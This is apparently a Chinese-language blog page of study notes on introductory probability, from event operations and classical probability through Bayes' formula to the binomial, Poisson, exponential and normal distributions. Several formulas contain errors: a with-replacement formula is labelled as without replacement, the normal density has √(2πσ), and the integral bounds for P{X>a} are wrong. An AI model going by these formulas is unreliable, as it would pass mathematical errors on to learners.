<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>概率论与数理统计是研究随机现象统计规律的数学学科<br>概率论:研究如何定量描述随机现象及其规律<br>数理统计:以概率论为基础,研究怎样有效地收集、整理和分析带有随机性的数据,以对所考察的问题作出推断与决策的科学</p>
<h2 id="概率论的基本概念"><a href="#概率论的基本概念" class="headerlink" title="概率论的基本概念"></a>概率论的基本概念</h2><h3 id="随机事件与样本空间"><a href="#随机事件与样本空间" class="headerlink" title="随机事件与样本空间"></a>随机事件与样本空间</h3><h4 id="两类现象"><a href="#两类现象" class="headerlink" title="两类现象"></a>两类现象</h4><ol>
<li>确定性现象:在一定条件下必然发生的现象称为确定性现象</li>
<li>随机现象:在一定条件下可能出现也可能不出现的现象称为随机现象(在个别试验中试验结果呈现不确定性,在大量重复试验中结果具有统计规律性)</li>
</ol>
<h4 id="随机试验"><a href="#随机试验" class="headerlink" title="随机试验"></a>随机试验</h4><p>对随机现象的观察、记录、实验统称为随机试验,通常用E表示<br>随机试验具有以下共同特点:</p>
<ol>
<li>可以在相同的条件下重复进行</li>
<li>每次试验的可能的结果不止一个,并且能事先明确试验的所有可能结果</li>
<li>试验之前不能确定哪一个结果会出现</li>
</ol>
<h4 id="样本空间"><a href="#样本空间" class="headerlink" title="样本空间"></a>样本空间</h4><p>随机试验E的所有可能结果所组成的集合称为E的样本空间,通常记作Ω</p>
<p>样本空间的<strong>元素</strong>,即E的每个结果,称为样本点</p>
<blockquote>
<p>注:试验目的不同,对应的样本空间也不一定相同</p>
<p>例如:</p>
<p>E :拋两枚硬币<br>若观察正面H和反面T出现的情况,则样本空间为 Ω={HH,HT,TH,TT}<br>若观察出现正面的次数,则样本空间为Ω={0,1,2}</p>
</blockquote>
<h4 id="随机事件"><a href="#随机事件" class="headerlink" title="随机事件"></a>随机事件</h4><p>试验E的样本空间Ω的子集称为E的随机事件,简称事件,用A,B,C,…表示</p>
<p>若某事件A中所包含的某个样本点出现,则称事件A发生</p>
<blockquote>
<p>基本事件:由一个样本点组成的单点集</p>
<p>必然事件:在试验中必定发生的事件</p>
<p>不可能事件:在一次试验中不可能发生的事件,记作Φ(空集)</p>
</blockquote>
<h3 id="事件的关系与运算"><a href="#事件的关系与运算" class="headerlink" title="事件的关系与运算"></a>事件的关系与运算</h3><h4 id="事件的关系"><a href="#事件的关系" class="headerlink" title="事件的关系"></a>事件的关系</h4><h5 id="包含关系"><a href="#包含关系" class="headerlink" title="包含关系"></a>包含关系</h5><p>若事件A发生,必然导致事件B发生,则称事件B包含事件A,或称事件A包含于事件B,记作B⊃A或A⊂B</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303135755095.png" alt="包含关系"></p>
<h5 id="相等"><a href="#相等" class="headerlink" title="相等"></a>相等</h5><p>若事件A包含事件B,且事件B包含事件A,则称事件A与事件B相等,记作A=B</p>
<h5 id="事件的并-和"><a href="#事件的并-和" class="headerlink" title="事件的并(和)"></a>事件的并(和)</h5><p>事件A、B至少有一个发生所构成的事件叫做事件A与事件B的和,记作A∪B或A+B</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303141506346.png" alt="事件的并"></p>
<blockquote>
<p>推广:$\bigcup_{i=1}^{n}A_{i}$为事件$A_{1},A_{2}…A_{n}$的和事件或并事件</p>
<p>含义:$A_{1},A_{2}…A_{n}$至少有一个发生</p>
</blockquote>
<h5 id="事件的交-积"><a href="#事件的交-积" class="headerlink" title="事件的交(积)"></a>事件的交(积)</h5><p>事件A、B同时发生所构成的事件叫做事件A与事件B的积,记作A∩B或AB</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303141523907.png" alt="事件的交"></p>
<blockquote>
<p>推广:$\bigcap_{i=1}^{n}A_{i}$为事件$A_{1},A_{2}…A_{n}$的交事件或积事件</p>
<p>含义:$A_{1},A_{2}…A_{n}$同时发生</p>
</blockquote>
<h5 id="事件的差"><a href="#事件的差" class="headerlink" title="事件的差"></a>事件的差</h5><p>由事件A发生且事件B不发生所组成的事件称为事件A与B的差,记作A-B</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303141705094.png" alt="事件的差"></p>
<blockquote>
<p>重要恒等式:A-B=A-AB=A$\bar B$</p>
</blockquote>
<h5 id="事件的互不相容-互斥"><a href="#事件的互不相容-互斥" class="headerlink" title="事件的互不相容(互斥)"></a>事件的互不相容(互斥)</h5><p>若A∩B=Φ中,即A与B不能同时发生,则称事件A与事件B是互不相容或互斥</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303144734089.png" alt="事件的互斥"></p>
<h5 id="事件的互逆-对立"><a href="#事件的互逆-对立" class="headerlink" title="事件的互逆(对立)"></a>事件的互逆(对立)</h5><p>若A∩B=Φ且A∪B=Ω,即A与B有且只有一个发生,则称事件A与事件B是互逆的或互为对立事件,记作B=$\bar A$,则有A$\bar A$=Φ,A∪$\bar A$=Ω</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303151455230.png" alt="事件的互逆"></p>
<blockquote>
<p>注:事件的互斥与对立的关系对立一定互斥,但是互斥不一定对立</p>
</blockquote>
<h4 id="事件的运算"><a href="#事件的运算" class="headerlink" title="事件的运算"></a>事件的运算</h4><p>设A,B,C为事件,则有</p>
<ol>
<li><p>交换律  A∪B=B∪A,   AB=BA</p>
</li>
<li><p>结合律  (A∪B)∪C=A∪(B∪C)=(A∪C)∪B,  (AB)C=A(BC)=(AC)B</p>
</li>
<li><p>分配律<br>(A∪B)∩C=(A∩C)∪(B∩C)=AC∪BC,<br>(A∩B)∪C=(A∪C)∩(B∪C)=(A∪C)(B∪C)</p>
</li>
<li><p>德$\cdot $摩根律(对偶律): $\overline{A\cup B} =\bar{A} \cap \bar{B} $ , $\overline{A\cap B} =\bar{A} \cup \bar{B} $</p>
<p>$\overline{\bigcup_{i=1}^{n}A_{i}}$=${\bigcap_{i=1}^{n}\bar{A_{i}}}$ , $\overline{\bigcap_{i=1}^{n}A_{i}}$=${\bigcup_{i=1}^{n}\bar{A_{i}}}$</p>
<p>$\overline{\bigcup_{i=1}^{\infty}A_{i}}$=${\bigcap_{i=1}^{\infty }\bar{A_{i}}}$ , $\overline{\bigcap_{i=1}^{\infty}A_{i}}$=${\bigcup_{i=1}^{\infty }\bar{A_{i}}}$</p>
</li>
</ol>
<blockquote>
<p>例:设A,B,C为三事件,用A,B,C的运算关系表示下列各事件<br>(1)A发生,B与C不发生<br>(2)A,B,C中至少有一个发生<br>(3)A,B,C中不多于一个发生<br>(4)A,B,C中不多于两个发生</p>
<p>解:<br>(1) A$\bar B\bar C$ 或 A-B-C<br>(2)A$\cup $B$\cup $C 或 $\overline{\bar{A}\bar{B}\bar{C}} $<br>(3) $A\bar{B} \bar{C} \cup\bar{A} B\bar{C}  \cup \bar{A}\bar{B}C\cup \bar{A} \bar{B}\bar{C} $ 或  $\overline{AB\cup BC\cup AC} $ 或 $\overline{AB} \cap \overline{BC} \cap \overline{AC} $<br>(4)$\overline{ABC}$ 或  $\bar{A} \cup\bar{B} \cup \bar{C}$</p>
</blockquote>
<h3 id="随机事件的概率"><a href="#随机事件的概率" class="headerlink" title="随机事件的概率"></a>随机事件的概率</h3><h4 id="频率与概率"><a href="#频率与概率" class="headerlink" title="频率与概率"></a>频率与概率</h4><h5 id="频率"><a href="#频率" class="headerlink" title="频率"></a>频率</h5><p>在相同的条件下,进行了n次试验,在这n次试验中,事件A发生的次数$n_{A}$,称为事件A发生的<strong>频数</strong><br>比值$\frac{n_{A} }{n} $称为事件A发生的<strong>频率</strong>,并记成$f_{n} (A)$</p>
<p><strong>性质</strong>  设A是随机试验E的任一事件,则</p>
<ol>
<li>0$\le f_{n} (A)\le 1$</li>
<li>$f_{n} (\Omega )= 1$,$f_{n} (\Phi )=0$</li>
<li>若$A_{1} ,A_{2},…,A_{k}$是两两互不相容的事件,则$f(A_{1} \cup A_{2} \cup \cdots \cup A_{k} )=f_{n}(A_{1} )+f_{n}(A_{2} )+\cdots+f_{n}(A_{k} )$</li>
</ol>
<h5 id="概率"><a href="#概率" class="headerlink" title="概率"></a>概率</h5><h6 id="概率的统计学定义"><a href="#概率的统计学定义" class="headerlink" title="概率的统计学定义"></a>概率的统计学定义</h6><p>在随机试验中,若事件A出现的频率m/n随着试验次数n的增加,趋于某一常数p,则定义事件A的概率为p($0\le p\le 1$),记作P(A)=p</p>
<p>缺陷:无法用此定义直接计算概率</p>
<h6 id="概率的公理化定义"><a href="#概率的公理化定义" class="headerlink" title="概率的公理化定义"></a>概率的公理化定义</h6><p>设试验E的样本空间为$\Omega $,对于每一事件A,定义事件P(A),满足如下条件:<br>(1)非负性:P(A)≥0</p>
<p>规范性:P($\Omega$)=1</p>
<p>可列可加性:若$A_{1} ,A_{2},…$是两两互不相容的事件,则$P(A_{1} \cup A_{2} \cup \cdots  )=P_{n}(A_{1} )+P_{n}(A_{2} )+\cdots$</p>
<h6 id="概率的性质"><a href="#概率的性质" class="headerlink" title="概率的性质"></a>概率的性质</h6><ol>
<li>P($\phi $)= 0</li>
<li>若$A_{1} ,A_{2},…$是两两互不相容的事件,则$P(A_{1} \cup A_{2} \cup \cdots \cup A_{n}  )=P_{n}(A_{1} )+P_{n}(A_{2} )+\cdots+P_{n}(A_{n})$(概率的有限可加性)</li>
<li>对于任意事件A有P(A)≤1</li>
<li>设$\bar{A} $是A的对立事件,则P($\bar{A} $)=1- P(A)</li>
<li>A, B是两事件,若A$\subset $B,则<ol>
<li>P(B-A)=P(B)-P(A) </li>
<li>P(A)≤P(B)</li>
<li>一般地,对于任意时间A,B有P(A-B)=P(A)-P(AB)(减法公式)</li>
</ol>
</li>
<li>加法公式  P($A \cup B$)=P(A)+P(B)-P(AB)<ol>
<li>推广:P($A \cup B \cup C$)=P(A)+P(B)+P(C)-P(AB)-P(AC)-P(BC)+P(ABC)</li>
</ol>
</li>
</ol>
<h4 id="古典概型"><a href="#古典概型" class="headerlink" title="古典概型"></a>古典概型</h4><p>若随机试验 E满足:</p>
<ol>
<li>E的样本空间$\Omega$中含有有限个样本点</li>
<li>每个样本点出现的可能性相同,则试验E称为古典概型(有限等可能概型)</li>
</ol>
<p>设$\Omega$={$\omega _{1} ,\omega _{2} ,\cdots ,\omega _{n} $},则$P(\omega _{i})=\frac{1}{n}  $(i=1,2,$\cdots$,n)</p>
<p>设A为E的任意一个事件,A中包含k个基本事件,则P(A)=$\frac{k}{n}$,即P(A)=$\frac{A所含样本点个数}{\Omega 所含样本点个数} $</p>
<h5 id="经典问题"><a href="#经典问题" class="headerlink" title="经典问题"></a>经典问题</h5><h6 id="无放回摸球"><a href="#无放回摸球" class="headerlink" title="无放回摸球"></a>无放回摸球</h6><div class="note info">
            <p>例:设袋中有M个红球和N个黑球,现从袋中无放回地依次摸出m+n个球,求所取球恰好含m个红球,n个黑球的概率?</p>
          </div>
<div class="note success">
            <p>解: 设A:”所取球恰好含m个红球,n个黑球”</p><p>样本点总数为$C_{M+N}^{m+n} $</p><p>A所含的样本点个数为$C_{M}^{m} C_{N}^{n}$</p><p>故P(A)=$\frac{C_{M}^{m} C_{N}^{n}}{C_{M+N}^{m+n} } $</p>
          </div>
<h6 id="有放回摸球"><a href="#有放回摸球" class="headerlink" title="有放回摸球"></a>有放回摸球</h6><div class="note primary">
            <p>一般地: 一批产品共M+N件,其中M件正品,N件次品,从中依次取出n件,A:”其中恰有k件次品”,分别在”有放回”和”不放回”抽取方式下求P(A).</p>
          </div>
<div class="note info">
            <p><strong>无放回</strong></p><p>$P(A)=C_{n}^{k}\left (  \frac{N}{M+N}\right ) ^{k}  \left (  \frac{M}{M+N}\right ) ^{n-k} $,$k=0,1,\cdots ,n$</p><p><strong>不放回(一块取)</strong></p><p>样本点总数为$C_{M+N}^{n} $</p><p>A所含的样本点个数为$C_{M}^{n-k} C_{N}^{k}$</p><p>故P(A)=$\frac{C_{M}^{n-k} C_{N}^{k}}{C_{M+N}^{n} } $</p>
          </div>
<div class="note ">
            <p>例:某班共有n名同学,全年按365天计算,求下列事件的概率.<br>A:”某指定n天,每位同学生日各占一天”<br>B:”全年某天,恰有两人在这一天生日相同”<br>C:”全班同学生日各不相同”</p>
          </div>
<div class="note info">
            <p>解:先求样本空间中所含样本点的个数<br>n个人在365天中过生日共有$365^{n} $种可能<br>(1)某指定n天,每位同学生日各占一天共有n!种可能,从而P(A)=$\frac{n!}{365^{n} } $<br>(2)全年某天,恰有两人在这一天生日相同</p>
          </div>
<h4 id="几何概型"><a href="#几何概型" class="headerlink" title="几何概型"></a>几何概型</h4><h3 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h3><h4 id="条件概率公式"><a href="#条件概率公式" class="headerlink" title="条件概率公式"></a>条件概率公式</h4><p>设A,B是两个事件,且P(A)&gt; 0,称P(B|A)=$\frac{P(AB)}{P(A)} $为在事件A发生的条件下事件B发生的条件概率;同理可得,P(A|B)=$\frac{P(AB)}{P(B)} $(P(B)&gt;0)为在事件B发生的条件下事件A发生的条件概率</p>
<h4 id="条件概率的性质"><a href="#条件概率的性质" class="headerlink" title="条件概率的性质"></a>条件概率的性质</h4><ol>
<li>非负性: P(B|A)≥0</li>
<li>规范性: P($\Omega $|B)=1, P($\phi $|B)= 0</li>
<li>可列可加性:设$B_{1} ,B_{2},\cdots $是两两不相容的事件,则有$P\left ( \bigcup_{i=1}^{\infty }\mid A  \right ) =\sum_{i=1}^{\infty } P(B_{i}|A )$</li>
<li>P(A|B)=1-P($\bar{A} $|B)</li>
<li>$P(A_{1} \cup A_{2}|B)=P(A_{1}|B)+P(A_{2}|B)-P(A_{1}A_{2}|B)$$P(A_{1}\cup A_{2})=P(A_{1})+P(A_{2})-P(A_{1}A_{2})$</li>
</ol>
<h4 id="乘法公式"><a href="#乘法公式" class="headerlink" title="乘法公式"></a>乘法公式</h4><p>$P(AB)=P(A|B)P(B)=P(B|A)P(A)$</p>
<p>推广:$P(A_{1}A_{2}\cdots A_{n})=P(A_{1})P(A_{2}|A_{1})P(A_{3}|A_{1}A_{2})\cdots P(A_{n}|A_{1}A_{2}\cdots A_{n-1})$</p>
<h4 id="全概率公式"><a href="#全概率公式" class="headerlink" title="全概率公式"></a>全概率公式</h4><h5 id="样本空间的划分"><a href="#样本空间的划分" class="headerlink" title="样本空间的划分"></a>样本空间的划分</h5><p>设$\Omega $为试验E的样本空间$B_{1},B_{2},\cdots ,B_{n}$为E的一组事件,若</p>
<ol>
<li>$B_{i}B_{j}=\emptyset;i\ne  j; i,j=1,2,\cdots ,n$</li>
<li>$B_{1}\cup B_{2}\cup \cdots \cup B_{n}=\Omega $</li>
</ol>
<p>则称$B_{1},B_{2},\cdots ,B_{n}$为样本空间$\Omega $的一个划分</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210316215147380.png" alt=""></p>
<h5 id="全概率公式-1"><a href="#全概率公式-1" class="headerlink" title="全概率公式"></a>全概率公式</h5><p>设试验E的样本空间为$\Omega $, A为任意事件, $B_{1},B_{2},\cdots ,B_{n}$为$\Omega $的一个划分,且$P(B_{i})&gt;0$,(i=1,2,$\cdots$n),则$P(A)=P(A|B_{1})P(B_{1})+P(A|B_{2})P(B_{2})+\cdots P(A|B_{n})P(B_{n})$<br><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210316215952637.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210316220207899.png" alt=""></p>
<h5 id="贝叶斯公式"><a href="#贝叶斯公式" class="headerlink" title="贝叶斯公式"></a>贝叶斯公式</h5><p>设试验E的样本空间为$\Omega $, A为任意事件, $B_{1},B_{2},\cdots ,B_{n}$为$\Omega $的一个划分,且P(A)&gt;0,$P(B_{i})&gt;0$,(i=1,2,$\cdots$n), 则</p>
<p>$P(B_{i}|A)=\frac{P(A|B_{i})P(B_{i})}{\sum_{j=1}^{n}P(A|B_{j})P(B_{j}) } $,(i=1,2,$\cdots$n)</p>
<h4 id="事件的独立性"><a href="#事件的独立性" class="headerlink" title="事件的独立性"></a>事件的独立性</h4><p>对两个事件A、B,如果P(AB)= P(A)P(B),则称A、B相互独立</p>
<blockquote>
<p><strong>定理一</strong>:设A、B是相互独立的两事件,若P(A)&gt;0,则P(B|A)=P(B),若P(B)&gt;0,则P(A|B)=P(A)</p>
<p>定理二:设A、B是相互独立的两事件,则下列各对事件也相互独立:</p>
<ol>
<li>A与$\bar{B} $;</li>
<li>$\bar{A} $与B;</li>
<li>$\bar{A} $与$\bar{B} $</li>
</ol>
</blockquote>
<p>对于三个事件A、B、C,</p>
<ol>
<li>P(AB)= P(A)P(B)</li>
<li>P(AC)= P(A)P(C)</li>
<li>P(BC)= P(B)P(C)</li>
<li>P(ABC)= P(A)P(B)P(C)</li>
</ol>
<p>若(1)、(2)、(3)同时成立,则称事件A、B、C两两独立;若(1)、(2)、(3)、(4)同时成立,则称事件A、B、C相互独立;相互独立必定两两独立,两两独立不一定相互独立.</p>
<blockquote>
<p>推广:设$A_{1},A_{2},\cdots A_{n}$为n个事件,如果对其中任意s(2≤s≤n)个事件$A_{k1},A_{k2},\cdots A_{ks}$,均有:$P(A_{k1},A_{k2},\cdots A_{ks})=P(A_{k1})P(A_{k2})\cdots P(A_{ks})$则称$A_{1},A_{2},\cdots A_{n}$这n个事件相互独立</p>
</blockquote>
<h2 id="随机变量及其分布"><a href="#随机变量及其分布" class="headerlink" title="随机变量及其分布"></a>随机变量及其分布</h2><h3 id="随机变量的概念"><a href="#随机变量的概念" class="headerlink" title="随机变量的概念"></a>随机变量的概念</h3><p>设E是随机试验,它的样本空间为$\Omega ={\omega }$,如果对于每$\omega \in \Omega $,都有一个实数$X(\omega )$与之对应,这样就得到一个定义在$\Omega$上的单值实值函数$X(\omega )$,称$X(\omega )$为随机变量函数,简称<strong>随机变量</strong>.常用X、Y、Z$\cdots $或$\xi、\eta $表示</p>
<p>注意:</p>
<ol>
<li>随机变量与普通的函数不同<br>随机变量是一个函数,普通函数是定义在实数轴上的,而随机变量是定义在样本空间上的(样本空间的元素不一定是实数)</li>
<li>随机变量的取值具有一定的概率规律<br>随机变量随着试验的结果不同而取不同的值,由于试验的各个结果的出现具有一定的概率,因此随机变量的取值也有一定的概率规律</li>
</ol>
<h4 id="随机变量的分类"><a href="#随机变量的分类" class="headerlink" title="随机变量的分类"></a>随机变量的分类</h4><p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210317165450008.png" alt=""></p>
<h4 id="离散型随机变量"><a href="#离散型随机变量" class="headerlink" title="离散型随机变量"></a>离散型随机变量</h4><p>随机变量的取值是有限多个或无限可列多个,这样的随机变量称为<strong>离散型随机变量</strong></p>
<h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>设离散型随机变量X所有可能取的值为$x_{k}(k=1,2,\cdots )$,X取各个可能值的概率,即事件$\{X=x_{k}\}$的概率,为$P\{X=x_{k}\}=p_{k},k=1,2,\cdots  $,称此为离散型随机变量X的<strong>分布律</strong></p>
<h5 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h5><ol>
<li>$p_{k}\ge 0,k=1,2,\cdots $</li>
<li>$\sum_{k=1}^{\infty }p_{k}=1$</li>
</ol>
<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>某高校选修课”电影鉴赏”选中率为0.1,某同学有4次选课机会,选中为止,用随机变量X表示选择”电影鉴赏”课程的次数,求X的分布律</p>
<blockquote>
<p>解:X所有可能取的值为1,2,3,4<br>P{X=1}=0.1<br>P{X=2}=(1-0.1)×0.1=0.09<br>P{X=3}=(1-0.1)$^{2}$×0.1=0.081<br>P{X=4}=(1-0.1)$^{3}$=0.729</p>
</blockquote>
<h3 id="两点分布与二项分布"><a href="#两点分布与二项分布" class="headerlink" title="两点分布与二项分布"></a>两点分布与二项分布</h3><h4 id="两点分布-0-1分布"><a href="#两点分布-0-1分布" class="headerlink" title="两点分布(0-1分布)"></a>两点分布(0-1分布)</h4><p>设随机变量X只可能取0与1两个值,它的分布律为P(X=k)=p$^{k}$(1-p)$^{1-k}$,k=0,1(0&lt;p&lt;1),则称X服从(0-1)分布或两点分布</p>
<p>对于一次随机试验,事件A与$\bar{A} $有且只有一个发生,若P(A)=p,则P($\bar{A} $)=1-p,这样的试验称为<strong>伯努利试验</strong></p>
<h4 id="二项分布"><a href="#二项分布" class="headerlink" title="二项分布"></a>二项分布</h4><p>将伯努利试验独立地重复进行了n次,称为n重伯努利试验</p>
<p>n重伯努利试验需满足:</p>
<ol>
<li>独立,即各次试验的结果互不影响</li>
<li>同一结果在每次试验中出现的概率相同,即P(A)=p</li>
<li>事件A与A有且只有一个发生</li>
</ol>
<p>用X表示n重伯努利试验中事件A发生的次数,则P{X=k}=$C^{k}_{n}p^{k}(1-p)^{n-k}$,(k=1,2,$\cdots $n),此时称X服从参数为(n,p)的二项分布,记作X~B(n,p),且$\sum_{n}^{k=0}C^{k}_{n}P^{k}(1-p)^{n-k} =[p+(1-p)]=1$</p>
<h3 id="泊松分布"><a href="#泊松分布" class="headerlink" title="泊松分布"></a>泊松分布</h3><p>设随机变量所有可能取的值为0,1,2,$\cdots $,而取各个值的概率为$P\{X=k\}=\frac{\lambda ^{k}e^{-\lambda }}{k!} ,k=0,1,2,\cdots $,其中$\lambda$&gt; 0是常数,则称X服从参数为$\lambda$的泊松分布,记为X~P($\lambda$)或X~$\pi(\lambda)$</p>
<p>$\sum_{k=0}^{\infty }\frac{\lambda ^{k}e^{-\lambda }}{k!}=e^{-\lambda}\sum_{k=0}^{\infty }\frac{\lambda ^{k}}{k!}=e^{-\lambda } e^{\lambda}$,其中$\sum_{k=0}^{\infty }\frac{\lambda ^{k}}{k!}=e^{\lambda }$(根据麦克劳林公式)</p>
<blockquote>
<p>泊松分布适用于描述单位时间内随机事件发生的次数</p>
</blockquote>
<p>一般地,当n&gt;10,p&lt;0.1时,$C^{k}_{n}p^{k}(1-p)^{n-k}\approx \frac{\lambda ^{k}e^{-\lambda }}{k!}$其中,$\lambda =np$</p>
<h3 id="几何分布"><a href="#几何分布" class="headerlink" title="几何分布"></a>几何分布</h3><p>在伯努利试验中,若每次试验中事件A发生的概率为p, X表示试验中A首次发生的试验次数,X的取值为1,2,$\cdots $,则称X服从参数为p的几何分布,其分布律为P{X=k}=(1-p)$^{k-1}$p ,k=1,2,$\cdots $,记为X~G(p)</p>
<p>几何分布用来描述事件首次成功的概率模型</p>
<blockquote>
<p>例题<br>若小李每次射击的命中率为0.6,用X表示小李首次命中目标所用的射击次数,求X的分布律</p>
<p>解:<br>P{X=k}=(1- 0.6)$^{k-1}$0.6= (0.4)$^{k-1}$0.6,k=1,2,$\cdots$</p>
</blockquote>
<p><strong>P{X&gt;m+n|X&gt;m}=P{X&gt;n}</strong></p>
<h3 id="超几何分布"><a href="#超几何分布" class="headerlink" title="超几何分布"></a>超几何分布</h3><p>相当于古典概型中的无放回问题</p>
<p>设N件产品中有M件次品,从中任取n件产品,得到的次品数X为随机变量P{X=k}=$\frac{C^{k}_{m}C^{n-k}_{N-M}}{C^{n}_{N}} $,k=0,1,2,$\cdots$,min(n,M),则称X服从<strong>超几何分布</strong></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210319194619072.png" alt=""></p>
<blockquote>
<p>当n$\ll$N时,即抽取的产品数远小于产品总数时,作无放回抽取,随着M产品总数改变,次品率p=$\frac{M}{N} $改变微乎其微,因此,当n$\ll$N时,无放回抽取可看作有放回抽取</p>
</blockquote>
<h3 id="随机变量的分布函数"><a href="#随机变量的分布函数" class="headerlink" title="随机变量的分布函数"></a>随机变量的分布函数</h3><p>设X是一个随机变量,x是任意实数,函数F(x)= P{X$\le $x}称为X的概率分布函数,简称分布函数, F(x)也写成F$_{X}$(x)</p>
<ol>
<li><p>分布函数主要研究随机变量在某一区间内取值的概率情况</p>
<p>$P\{a&lt;X\le b\}=P\{X\le b\}-P\{X\le a\}=F(b)-F(a)$</p>
<p>$P\{a\le X\le b\}=F(b)-F(a)+P\{X=a\}$</p>
<p>$P\{a&lt;X&lt;b\}=F(b)-F(a)-P\{X=b\}$</p>
</li>
<li><p>分布函数F(x)是关于x的一个普通实函数,而不是随机变量函数</p>
</li>
</ol>
<h4 id="分布函数的性质"><a href="#分布函数的性质" class="headerlink" title="分布函数的性质"></a>分布函数的性质</h4><ol>
<li><p>$0\le F(x)\le 1,x\in (-\infty ,\infty )$</p>
<p>$F(-\infty )=\lim_{x \to \infty} F(x)=0,F(+\infty )=\lim_{x \to \infty} F(x)=1$</p>
</li>
<li><p>$F(x_{}1)\le F(x_{}2),(x_{1}\le x_{2})$ (单调不减)</p>
</li>
<li><p>$\lim_{x \to x^{+}_{0}} F(x)=F(x_{0}),(-\infty &lt;x_{0}&lt;\infty )$ (右连续)</p>
</li>
</ol>
<h3 id="连续型随机变量"><a href="#连续型随机变量" class="headerlink" title="连续型随机变量"></a>连续型随机变量</h3><p>若对于随机变量X的分布函数F(x),存在非负可积函数f(x),使对于$\forall $x∈R,有$ F(x)=\int_{-\infty }^{x} f(t)dt$,则称X为<strong>连续型随机变量</strong>,其中f(x)称为X的概率密度函数,简称<strong>概率密度</strong></p>
<h4 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h4><ol>
<li><p>f(x)$\ge$0</p>
</li>
<li><p>$\int_{-\infty }^{+\infty } f(x)dx=1$</p>
</li>
<li><p>$ P\{x_{1}&lt;X&lt;x_{2}\}=F(x_{2})-F(x_{1})=\int_{x_{1}}^{x_{2}}f(x)dx$</p>
</li>
<li><p>$P\{X\le a\}=F(a)=\int_{-\infty }^{a} f(x)dx$</p>
<p>$P\{X&gt;a\}=1-P\{X\le a\}=1-F(a)=\int_{-\infty }^{a} f(x)dx$</p>
</li>
<li><p>对于任意可能值a,连续型随机变量取a的概率等于零,即P{X=a}=0,$\int_{a}^{a} f(x)dx=0$,故$P\{x_{1}&lt;X\le x_{2}\}=P\{x_{1}\le X\le x_{2}\}=P\{x_{1}&lt;X&lt;x_{2}\}$</p>
<p>连续型随机变量取值落在某一区间的概率与区间的开闭无关</p>
</li>
<li><p>若f(x)在点x处连续,则有F(x)`=f(x)</p>
</li>
</ol>
<blockquote>
<p>若X是连续型随机变量,{X=a}是不可能事件,则有P{X=a}=0;若P{ X=a}=0,事件{X=a}未必是不可能事件<br>若X是离散型随机变量,概率{X=a}是不可能事件$\rightleftharpoons $P{X=a}=0</p>
</blockquote>
<h4 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h4><p>定义设连续型随机变量X具有概率密度$f(x)=\left\{\begin{matrix}<br>  \frac{1}{b-a}, &amp;a&lt;x&lt;b ,\\0 ,<br>  &amp;其它.<br>\end{matrix}\right.$,则称X在区间(a,b)服从均匀分布,记为X~U(a,b)</p>
<blockquote>
<p>X~U(a,b),则X落在区间(a,b)中任意等长度的子区间内的可能性是相同的</p>
<p>均匀分布的本质—几何概型</p>
</blockquote>
<h5 id="分布函数"><a href="#分布函数" class="headerlink" title="分布函数"></a>分布函数</h5><p>$F(x)=\int_{-\infty }^{x} f(t)dt=\left\{\begin{matrix}<br> 0, &amp; x&lt;a,\\<br>  \frac{x-a}{b-a}, &amp;a\le x&lt;b, \\<br>  1,&amp;x\ge b.<br>\end{matrix}\right.$</p>
<h4 id="指数分布"><a href="#指数分布" class="headerlink" title="指数分布"></a>指数分布</h4><p>定义设连续型随机变量X的概率密度为$f(x)=\left\{\begin{matrix}<br>  \lambda e^{-\lambda x},&amp;x&gt;0, \\<br>  0,&amp;x\le 0.<br>\end{matrix}\right.$,其中$\lambda$&gt;0为常数,则称X服从参数为$\lambda$的指数分布,记为X~e($\lambda$)或X~Exp($\lambda$)</p>
<h5 id="分布函数-1"><a href="#分布函数-1" class="headerlink" title="分布函数"></a>分布函数</h5><p>$ F(x)=\left\{\begin{matrix}<br>  1-e^{-\lambda x},&amp;x&gt;0 ,\\<br>  0,&amp;x\le 0.<br>\end{matrix}\right.$</p>
<blockquote>
<p>指数分布是独立事件发生的时间间隔的分布</p>
<p>无记忆性:P{X&gt;s+t|X&gt;s}=P{X&gt;t}</p>
</blockquote>
<p>指数分布的应用:某些元件或设备的寿命服从指数分布</p>
<h4 id="正态分布"><a href="#正态分布" class="headerlink" title="正态分布"></a>正态分布</h4><p>设连续型随机变量X的概率密度为$f(x)=\frac{1}{\sqrt{2\pi \sigma } }e^{-\frac{(x-\mu )^{2}}{2\sigma^{2} } } ,-\infty <x<+\infty $,其中$\mu ,\sigma (\sigma >0)$为常数,则称X服从参数为$\mu ,\sigma^{2}$的正态分布或高斯分布,记为X~N($\mu ,\sigma^{2}$)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320094806673.png" alt=""></p>
<ol>
<li><p>f(x)关于x=$\mu$对称</p>
</li>
<li><p>当x=$\mu$时,f(x)取得最大值$\frac{1}{\sqrt{2\pi \sigma } } $</p>
</li>
<li><p>当$x\to \pm \infty $,f(x)$\to $0</p>
</li>
<li><p>曲线在x=$\mu \pm \sigma $处有拐点</p>
</li>
<li><p>当固定$\sigma$,改变$\mu$的大小时,f(x)图形的形状不变,只是沿着x轴作平移变换</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320095039164.png" alt=""></p>
</li>
<li><p>当固定$\mu$,改变$\sigma$的大小时,f(x)图形的对称轴不变,而形状在改变,$\sigma$越小,图形越高越瘦;$\sigma$越大,图形越矮越胖</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210320095310748.png" alt=""></p>
</li>
</ol>
